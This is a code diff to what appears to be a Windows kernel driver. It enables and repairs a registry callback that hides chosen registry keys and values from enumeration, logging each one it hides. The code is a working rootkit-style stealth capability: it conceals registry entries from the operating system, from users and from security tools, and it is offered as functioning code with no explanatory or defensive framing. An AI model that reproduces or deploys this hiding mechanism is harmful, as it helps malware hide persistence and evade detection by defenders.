@@ -32,9 +32,9 @@ NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2) {
 	case RegNtPostEnumerateKey:
 		status = RegNtPostEnumerateKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
 		break;
-		/*case RegNtPostEnumerateValueKey:
-			status = RegNtPostEnumerateValueKeyHandler((PREG_POST_OPERATION_INFORMATION)regInfo);
-			break;*/
+	case RegNtPostEnumerateValueKey:
+		status = RegNtPostEnumerateValueKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
+		break;
 	}
 
 	return status;
@@ -190,7 +190,7 @@ NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 				copyKeyInformationData = false;
 			}
 			else {
-				counter = 1;
+				counter++;
 				auto prevIrql = KeGetCurrentIrql();
 				KeLowerIrql(PASSIVE_LEVEL);
 				KdPrint((DRIVER_PREFIX "Hid registry key %ws\n", item.KeyPath));
@@ -217,14 +217,14 @@ NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	HANDLE key;
 	PVOID tempValueInformation;
-	PREG_ENUMERATE_VALUE_KEY_INFORMATION preInfo;
+	REG_ENUMERATE_VALUE_KEY_INFORMATION* preInfo;
 	PCUNICODE_STRING regPath;
 	UNICODE_STRING valueName;
 	ULONG resultLength;
 	RegItem item;
 	NTSTATUS status = STATUS_SUCCESS;
 	bool copyKeyInformationData = true;
-	int counter = 1;
+	int counter = 0;
 
 	if (!NT_SUCCESS(info->Status)) {
 		return STATUS_SUCCESS;
@@ -242,12 +242,13 @@ NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info)
 		return STATUS_SUCCESS;
 	}
 
-	preInfo = (PREG_ENUMERATE_VALUE_KEY_INFORMATION)info->PreInformation;
+	preInfo = (REG_ENUMERATE_VALUE_KEY_INFORMATION*)info->PreInformation;
 
 	if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
 		CmCallbackReleaseKeyObjectIDEx(regPath);
 		return STATUS_SUCCESS;
 	}
+	valueName.Buffer[valueName.Length / sizeof(WCHAR)] = L'\0';
 
 	// Rebuilding the KeyInformation without the hidden keys.
 	status = ObOpenObjectByPointerWithTag(info->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, KernelMode, DRIVER_TAG, &key);
@@ -260,57 +261,24 @@ NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info)
 	tempValueInformation = (PVOID)ExAllocatePoolWithTag(PagedPool, preInfo->Length, DRIVER_TAG);
 
 	if (tempValueInformation) {
-		//item = (RegItem*)ExAllocatePoolWithTag(PagedPool, sizeof(RegItem), DRIVER_TAG);
-
-		//if (item) {
-		//	item->Type = REG_TYPE_VALUE;
-
-		//	// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
-		//	while (copyKeyInformationData) {
-		//		wcscpy_s(item->KeyPath, wcslen(regPath->Buffer) + 1, regPath->Buffer);
-		//		wcscpy_s(item->ValueName, wcslen(valueName.Buffer) + 1, valueName.Buffer);
-		//		status = ZwEnumerateValueKey(key, preInfo->Index + counter, preInfo->KeyValueInformationClass, tempValueInformation, preInfo->Length, &resultLength);
-
-		//		if (!NT_SUCCESS(status)) {
-		//			copyKeyInformationData = false;
-		//			continue;
-		//		}
-
-		//		if (!FindRegItem(item)) {
-		//			*preInfo->ResultLength = resultLength;
-
-		//			// Adding the try & except to be sure, copying memory shouldn't cause a problem.
-		//			__try {
-		//				RtlCopyMemory(preInfo->KeyValueInformation, tempValueInformation, resultLength);
-		//			}
-		//			__except (EXCEPTION_EXECUTE_HANDLER) {}
-
-		//			copyKeyInformationData = false;
-		//			continue;
-		//		}
-
-		//		if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
-		//			copyKeyInformationData = false;
-		//		}
-		//	}
-		//	ExFreePoolWithTag(item, DRIVER_TAG);
-		//	item = nullptr;
-		//}
-
 		item.Type = REG_TYPE_VALUE;
+		wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 
 		// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
 		while (copyKeyInformationData) {
-			/*wcscpy_s(item->KeyPath, wcslen(regPath->Buffer) + 1, regPath->Buffer);
-			wcscpy_s(item->ValueName, wcslen(valueName.Buffer) + 1, valueName.Buffer);*/
-			wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
-			wcsncpy_s(item.KeyPath, valueName.Buffer, valueName.Length / sizeof(WCHAR));
 			status = ZwEnumerateValueKey(key, preInfo->Index + counter, preInfo->KeyValueInformationClass, tempValueInformation, preInfo->Length, &resultLength);
 
 			if (!NT_SUCCESS(status)) {
 				copyKeyInformationData = false;
 				continue;
 			}
+
+			if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
+				copyKeyInformationData = false;
+			}
+			valueName.Buffer[valueName.Length / sizeof(WCHAR)] = L'\0';
+			item.ValueName[0] = L'\0';
+			wcsncpy_s(item.ValueName, valueName.Buffer, valueName.Length / sizeof(WCHAR));
 
 			if (!FindRegItem(item)) {
 				*preInfo->ResultLength = resultLength;
@@ -324,9 +292,12 @@ NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info)
 				copyKeyInformationData = false;
 				continue;
 			}
-
-			if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
-				copyKeyInformationData = false;
+			else {
+				counter++;
+				auto prevIrql = KeGetCurrentIrql();
+				KeLowerIrql(PASSIVE_LEVEL);
+				KdPrint((DRIVER_PREFIX "Hid registry value %ws\n", item.KeyPath));
+				KeRaiseIrql(prevIrql, &prevIrql);
 			}
 		}
 
@@ -346,7 +317,7 @@ bool GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID in
 	switch (infoClass) {
 	case KeyValueBasicInformation:
 	{
-		PKEY_VALUE_BASIC_INFORMATION valueInfo = (PKEY_VALUE_BASIC_INFORMATION)information;
+		KEY_VALUE_BASIC_INFORMATION* valueInfo = (KEY_VALUE_BASIC_INFORMATION*)information;
 		valueName->Buffer = valueInfo->Name;
 		valueName->Length = (USHORT)valueInfo->NameLength;
 		valueName->MaximumLength = (USHORT)valueInfo->NameLength;
@@ -355,7 +326,7 @@ bool GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID in
 	case KeyValueFullInformation:
 	case KeyValueFullInformationAlign64:
 	{
-		PKEY_VALUE_FULL_INFORMATION valueInfo = (PKEY_VALUE_FULL_INFORMATION)information;
+		KEY_VALUE_FULL_INFORMATION* valueInfo = (KEY_VALUE_FULL_INFORMATION*)information;
 		valueName->Buffer = valueInfo->Name;
 		valueName->Length = (USHORT)valueInfo->NameLength;
 		valueName->MaximumLength = (USHORT)valueInfo->NameLength;
